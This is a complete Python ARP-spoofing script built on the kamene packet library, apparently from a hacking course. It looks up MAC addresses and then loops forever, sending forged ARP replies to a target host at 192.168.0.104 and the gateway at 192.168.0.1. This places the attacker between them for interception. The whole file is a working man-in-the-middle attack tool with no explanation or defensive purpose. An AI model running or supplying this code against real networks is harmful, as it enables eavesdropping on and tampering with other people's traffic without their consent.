#!/usr/bin/env python
import kamene.all as kamene
import time
import sys

def get_mac(ip):
    arp_request = kamene.ARP(pdst = ip)
    broadcast = kamene.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answererd_list = kamene.srp(arp_request_broadcast, timeout = 1, verbose = False)[0]
    return (answererd_list[0][1].hwsrc)


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = kamene.ARP(op=2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    kamene.send(packet, verbose = False)

if __name__ == "__main__":
    sent_packets_count = 0
    while True:
        spoof("192.168.0.104","192.168.0.1")
        spoof("192.168.0.1","192.168.0.104")
        sent_packets_count += 2
        print("\r[+]Packets sent: "+str(sent_packets_count), end = "")
        sys.stdout.flush()
        time.sleep(4)
